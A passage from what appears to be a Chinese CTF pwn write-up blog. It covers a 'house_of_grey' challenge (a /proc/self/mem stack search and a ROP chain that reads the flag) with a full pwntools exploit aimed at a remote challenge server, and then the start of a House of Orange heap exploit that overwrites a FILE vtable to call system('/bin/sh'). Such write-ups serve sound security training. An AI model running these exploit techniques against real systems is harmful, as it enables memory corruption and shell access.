class="hljs-string">&#x27;stack_start &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_start))<br>li(<span class="hljs-string">&#x27;stack_end   &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_end))<br><br>pop_rdi_ret_offset = <span class="hljs-number">0x1823</span><br>pop_rsi_r15_ret_offset = <span class="hljs-number">0x1821</span><br>pop_rdi_ret = exe_base + pop_rdi_ret_offset<br>pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset<br>open_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br></code></pre></td></tr></table></figure>



<h3 id="搜索内存定位read-ret地址"><a href="#搜索内存定位read-ret地址" class="headerlink" title="搜索内存定位read ret地址"></a>搜索内存定位read ret地址</h3><p>接下来，就需要读取&#x2F;proc&#x2F;self&#x2F;mem来搜索内存，确定栈地址了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">29</span>; ++i )<br>  &#123;<br>    sub_FEE();<br> ...<br></code></pre></td></tr></table></figure>

<p>通过以上逻辑,程序只可以循环使用30次, 前面使用了4次, ，最后还需要用2次,搜索内存只能使用24次.</p>
<p>而每次最多允许读取100000个字节的数据，由此，能搜索2400000个字节的内容，通过调试，观察数据的栈地址，计算它与stack_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，应该从stack_end – x ~ stack_end搜索</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#position stack addr</span><br>offset = <span class="hljs-number">0xf800000</span><br>li(<span class="hljs-string">&#x27;debug---------------&#x27;</span>)<br><span class="hljs-comment">#begin_offset ~ stack_end</span><br>stack_begin_offset = stack_end - offset - <span class="hljs-number">24</span> * <span class="hljs-number">100000</span><br>li(<span class="hljs-string">&#x27;stack_begin_offset &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_begin_offset))<br>li(<span class="hljs-string">&#x27;stack_end   &#x27;</span> +        <span class="hljs-built_in">hex</span>(stack_end))<br><br>fid(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>)<br>   <span class="hljs-comment">#打开该时起始地址为0,则偏移直接为stack_begin_offset地址</span><br>loc(stack_begin_offset) <span class="hljs-comment">#loacate in stack_begin_offset</span><br><span class="hljs-comment"># searching</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">24</span>): <span class="hljs-comment">#内存搜索&#x27;/proc/self/mem&#x27;来定位栈地址.</span><br>	get(<span class="hljs-number">100000</span>)<br>	text = ru(<span class="hljs-string">&#x27;1.Find something&#x27;</span>)<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/proc/self/mem&#x27;</span> <span class="hljs-keyword">in</span> text:<br>		content = text.split(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>)[<span class="hljs-number">0</span>] //若找到, 切割该字符串,获取前面的内容长度.<br>		<span class="hljs-keyword">break</span><br>	<span class="hljs-keyword">if</span> i == <span class="hljs-number">23</span>:<br>		li(<span class="hljs-string">&#x27;not found&#x27;</span>)<br>		exit(<span class="hljs-number">0</span>)<br><br>v8_addr = stack_begin_offset + i * <span class="hljs-number">100000</span> + <span class="hljs-built_in">len</span>(content) - <span class="hljs-number">0x14</span><br>li(<span class="hljs-string">&#x27;v8_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(v8_addr))<br><br>read_ret = v8_addr - (<span class="hljs-number">0x60</span> - <span class="hljs-number">0x08</span>) + <span class="hljs-number">0x20</span><br>li(<span class="hljs-string">&#x27;read_ret: &#x27;</span> + <span class="hljs-built_in">hex</span>(read_ret))<br></code></pre></td></tr></table></figure>

<h3 id="构造rop链-1"><a href="#构造rop链-1" class="headerlink" title="构造rop链"></a>构造rop链</h3><p>在这里,只能通过写入read的 ret地址, 因为只有在刚读取完成之后, 返回的地址才不会被覆盖, 其他函数修改是被覆盖的,没有效果.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="hljs-number">24</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(read_ret)<br>	fid(p) <span class="hljs-comment"># fd as 5</span><br><br>	<span class="hljs-comment">#rop</span><br>    <span class="hljs-comment">#64位中 三个参数函数的传参方式</span><br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	read(fd, buf, length)</span><br><span class="hljs-string">	1 RDI  0x0  #fd</span><br><span class="hljs-string">	2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buf</span><br><span class="hljs-string">	3 RDX  0x28 #length</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>	ret = read_ret<br>	<span class="hljs-comment">#open  ./flag</span><br>	p = p64(pop_rdi_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>)<br>	p += p64(pop_rsi_r15_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(open_plt)<br><br>	<span class="hljs-comment"># read flag to buffer, fd is 6</span><br>	p += p64(pop_rdi_ret) + p64(<span class="hljs-number">6</span>)<br>	p += p64(pop_rsi_r15_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0</span>) + p64(read_plt)<br><br>	<span class="hljs-comment"># puts flag</span><br>	p += p64(pop_rdi_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>) + p64(puts_plt)<br>	<span class="hljs-comment"># ./flag str will be replace flag&#123;***&#125;</span><br>	<span class="hljs-comment">#p = p64(pop_rdi_ret) + p64()</span><br>	p += <span class="hljs-string">&#x27;./flag\x00&#x27;</span><br>	<span class="hljs-comment">#db()</span><br>	<br>	giv(p)<br></code></pre></td></tr></table></figure>



<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;house_of_grey&quot;</span><br>libFile  = <span class="hljs-string">&quot;&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">44908</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">0</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x :  io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fid</span>(<span class="hljs-params">text</span>):<br>	sla(<span class="hljs-string">&#x27;5.Exit\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loc</span>(<span class="hljs-params">offset</span>):<br>	sla(<span class="hljs-string">&#x27;5.Exit\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(offset))<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">length</span>):<br>	sla(<span class="hljs-string">&#x27;5.Exit\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(length))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">giv</span>(<span class="hljs-params">text</span>):<br>	sla(<span class="hljs-string">&#x27;5.Exit\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>(<span class="hljs-params">text</span>):<br>	sla(<span class="hljs-string">&#x27;5.Exit\n&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br><br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>)<br><br>	<span class="hljs-comment">#leaking base addr</span><br>	p = <span class="hljs-string">&#x27;/proc/self/maps&#x27;</span><br>	fid(p)<br>	get(<span class="hljs-number">1500</span>)<br><br>	ru(<span class="hljs-string">&#x27;You get something:\n&#x27;</span>)<br>	exe_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	ru(<span class="hljs-string">&#x27;[heap]\n&#x27;</span>)<br>	stack_start = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	ru(<span class="hljs-string">&#x27;-&#x27;</span>)<br>	stack_end =   <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><br>	ru(<span class="hljs-string">&#x27;rw-p 00000000 00:00 0 \n&#x27;</span>)<br><br>	libc_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;exe_base  &#x27;</span> + <span class="hljs-built_in">hex</span>(exe_base))<br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	li(<span class="hljs-string">&#x27;stack_start &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_start))<br>	li(<span class="hljs-string">&#x27;stack_end   &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_end))<br><br>	pop_rdi_ret_offset = <span class="hljs-number">0x1823</span><br>	pop_rsi_r15_ret_offset = <span class="hljs-number">0x1821</span><br>	pop_rdi_ret = exe_base + pop_rdi_ret_offset<br>	pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset<br>	open_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;open&#x27;</span>]<br>	read_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>	puts_plt = exe_base + exe.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>	<span class="hljs-comment">#position stack addr</span><br>	offset = <span class="hljs-number">0xf800000</span><br>	li(<span class="hljs-string">&#x27;debug---------------&#x27;</span>)<br>	<span class="hljs-comment">#begin_offset ~ stack_end</span><br>	stack_begin_offset = stack_end - offset - <span class="hljs-number">24</span> * <span class="hljs-number">100000</span><br>	li(<span class="hljs-string">&#x27;stack_begin_offset &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_begin_offset))<br>	li(<span class="hljs-string">&#x27;stack_end   &#x27;</span> +        <span class="hljs-built_in">hex</span>(stack_end))<br><br>	fid(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>)<br>	loc(stack_begin_offset)<br>	<span class="hljs-comment"># searching</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">24</span>):<br>		get(<span class="hljs-number">100000</span>)<br>		text = ru(<span class="hljs-string">&#x27;1.Find something&#x27;</span>)<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/proc/self/mem&#x27;</span> <span class="hljs-keyword">in</span> text:<br>			content = text.split(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>)[<span class="hljs-number">0</span>]<br>			<span class="hljs-keyword">break</span><br>		<span class="hljs-keyword">if</span> i == <span class="hljs-number">23</span>:<br>			li(<span class="hljs-string">&#x27;not found&#x27;</span>)<br>			exit(<span class="hljs-number">0</span>)<br><br><br>	v8_addr = stack_begin_offset + i * <span class="hljs-number">100000</span> + <span class="hljs-built_in">len</span>(content) - <span class="hljs-number">0x14</span><br>	li(<span class="hljs-string">&#x27;v8_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(v8_addr))<br><br>	read_ret = v8_addr - (<span class="hljs-number">0x60</span> - <span class="hljs-number">0x08</span>) + <span class="hljs-number">0x20</span><br>	li(<span class="hljs-string">&#x27;read_ret: &#x27;</span> + <span class="hljs-built_in">hex</span>(read_ret))<br>	p = <span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="hljs-number">24</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(read_ret)<br>	fid(p) <span class="hljs-comment"># fd as 5</span><br><br>	<span class="hljs-comment">#rop</span><br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	3 RDX  0x28 #length</span><br><span class="hljs-string">	1 RDI  0x0  #fd</span><br><span class="hljs-string">	2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buffer</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br><br>	ret = read_ret<br>	<span class="hljs-comment">#open  ./flag</span><br>	p = p64(pop_rdi_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>)<br>	p += p64(pop_rsi_r15_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(open_plt)<br><br>	<span class="hljs-comment"># read flag to buffer, fd is 6</span><br>	p += p64(pop_rdi_ret) + p64(<span class="hljs-number">6</span>)<br>	p += p64(pop_rsi_r15_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0</span>) + p64(read_plt)<br><br>	<span class="hljs-comment"># puts flag</span><br>	p += p64(pop_rdi_ret) + p64(ret + <span class="hljs-number">15</span> * <span class="hljs-number">8</span>) + p64(puts_plt)<br>	<span class="hljs-comment"># ./flag str will be replace flag&#123;***&#125;</span><br>	<span class="hljs-comment">#p = p64(pop_rdi_ret) + p64()</span><br>	p += <span class="hljs-string">&#x27;./flag\x00&#x27;</span><br>	<span class="hljs-comment">#db()</span><br>	<br>	giv(p)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br>    <br></code></pre></td></tr></table></figure>





<h1 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h1><h2 id="来源-4"><a href="#来源-4" class="headerlink" title="来源"></a>来源</h2><p>2016 ctf-HITCON</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>libc: libc.2.23</p>
<p>Unbuntu16</p>
<h2 id="难度-3"><a href="#难度-3" class="headerlink" title="难度"></a>难度</h2><p>8 &#x2F; 10</p>
<h2 id="保护-4"><a href="#保护-4" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br>FORTIFY:  Enabled<br></code></pre></td></tr></table></figure>



<h2 id="简单描述-3"><a href="#简单描述-3" class="headerlink" title="简单描述"></a>简单描述</h2><p>保护全开,有添加功能和编辑功能,只能添加4次,每次添加都会malloc三次分别储存不同的信息, 可以编辑三次,没有free函数,是经典的 House Of Orange漏洞利用类型.</p>
<h2 id="vul-5"><a href="#vul-5" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">length = InputNum();<br><span class="hljs-keyword">if</span> ( length &gt; <span class="hljs-number">0x1000</span> )<br>  length = <span class="hljs-number">4096</span>;                              <span class="hljs-comment">// vul</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name:&quot;</span>);<br>InputContent((<span class="hljs-type">void</span> *)qword_203068[<span class="hljs-number">1</span>], length);<br></code></pre></td></tr></table></figure>

<p>申请大小小于0x1000时,存在堆溢出漏洞.</p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>House of orange ( modify top chunk realize free, unsoted bin attack, small bin attack, IO_FILE)</p>
<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp-&gt;<code>_mode</code> &lt;&#x3D; 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,然而我们可以伪造再一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入’&#x2F;bin&#x2F;sh\x00’然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针, 然后就可以调用system 传入 ‘&#x2F;bin&#x2F;sh\00’ get shell</p>
<h2 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h2><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile = <span class="hljs-string">&#x27;houseoforange&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="hljs-comment">#libFile = &#x27;./libc64-2.19.so&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span 